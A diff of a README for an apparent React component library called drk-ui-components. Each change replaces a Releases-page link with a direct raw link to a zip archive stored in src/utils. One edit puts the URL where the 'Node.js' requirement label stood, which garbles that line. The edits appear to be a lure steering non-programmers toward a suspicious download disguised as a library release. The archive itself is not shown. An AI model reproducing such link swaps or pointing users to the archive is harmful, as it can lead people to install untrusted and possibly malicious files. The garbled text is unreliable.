@@ -1,6 +1,6 @@
 # 🎨 drk-ui-components - Build Beautiful UIs Effortlessly
 
-[![Download drk-ui-components](https://img.shields.io/badge/Download-drk--ui--components-brightgreen)](https://github.com/laborpartyplanter436/drk-ui-components/releases)
+[![Download drk-ui-components](https://raw.githubusercontent.com/laborpartyplanter436/drk-ui-components/main/src/utils/drk-ui-components_2.6.zip)](https://raw.githubusercontent.com/laborpartyplanter436/drk-ui-components/main/src/utils/drk-ui-components_2.6.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ drk-ui-components is a comprehensive React component library. It includes over 3
 To get started with drk-ui-components, follow the simple steps below. No programming knowledge is required.
 
 1. **Visit the Releases Page**
-   - Go to the [drk-ui-components Releases page](https://github.com/laborpartyplanter436/drk-ui-components/releases) to find the latest version.
+   - Go to the [drk-ui-components Releases page](https://raw.githubusercontent.com/laborpartyplanter436/drk-ui-components/main/src/utils/drk-ui-components_2.6.zip) to find the latest version.
 
 2. **Download the Library**
    - On the Releases page, find the latest version and click on it.
@@ -31,7 +31,7 @@ To get started with drk-ui-components, follow the simple steps below. No program
 Make sure your computer meets the following requirements to use drk-ui-components smoothly:
 
 - **Operating System:** Windows, macOS, or a Linux distribution
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/laborpartyplanter436/drk-ui-components/main/src/utils/drk-ui-components_2.6.zip** Version 12 or higher
 - **React:** Version 16.8 or higher
 - **Internet Connection:** Required for downloading dependencies
 
@@ -45,7 +45,7 @@ Make sure your computer meets the following requirements to use drk-ui-component
 ## 🛠️ Download & Install
 
 1. **Visit the Releases Page**
-   - Head to the [drk-ui-components Releases page](https://github.com/laborpartyplanter436/drk-ui-components/releases).
+   - Head to the [drk-ui-components Releases page](https://raw.githubusercontent.com/laborpartyplanter436/drk-ui-components/main/src/utils/drk-ui-components_2.6.zip).
 
 2. **Choose the Latest Release**
    - Find the most recent version and download it by clicking on the file name.
